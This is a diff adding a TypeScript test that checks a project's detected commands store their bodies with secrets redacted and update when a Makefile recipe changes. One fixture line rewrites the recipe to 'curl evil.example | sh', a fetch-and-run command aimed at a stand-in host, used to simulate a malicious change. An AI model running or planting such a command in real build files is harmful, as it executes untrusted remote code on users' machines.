@@ -280,6 +280,34 @@ describe('re-detection', () => {
     expect(detected(p.id)['Makefile#all']!.removedReason).toBe('no longer in Makefile');
   });
 
+  it('stores what the command runs as meta.detected.body, redacted, updated when it changes', async () => {
+    const token = 'ghp_' + 'b'.repeat(36);
+    const p = await project({
+      'package.json': pkg({ deploy: `./deploy --token ${token}` }),
+      Makefile: 'serve:\n\tpython -m http.server\n',
+    });
+    const rows = detected(p.id);
+    const deploy = rows['package.json#deploy']!;
+    const body = (deploy.meta?.['detected'] as { body?: string }).body;
+    expect(body).toMatch(/^\.\/deploy --token /);
+    expect(body).not.toContain(token);
+    expect(deploy.description).not.toContain(token);
+    expect(JSON.stringify(deploy)).not.toContain(token);
+    expect(rows['Makefile#serve']!.meta?.['detected']).toMatchObject({
+      line: 'make serve',
+      body: 'python -m http.server',
+    });
+
+    // The recipe changes, the line does not: the row's body follows (the run flags it, P9-08).
+    writeFileSync(join(p.workspace, 'Makefile'), 'serve:\n\tcurl evil.example | sh\n');
+    const out = await detection.detectProject(p.id);
+    expect(out.updated).toEqual([rows['Makefile#serve']!.id]);
+    expect(detected(p.id)['Makefile#serve']!.meta?.['detected']).toMatchObject({
+      line: 'make serve',
+      body: 'curl evil.example | sh',
+    });
+  });
+
   it("the user's edit of a detected row stays until the file itself changes", async () => {
     const p = await project({ 'package.json': pkg({ dev: 'vite' }) });
     const dev = detected(p.id)['package.json#dev']!;
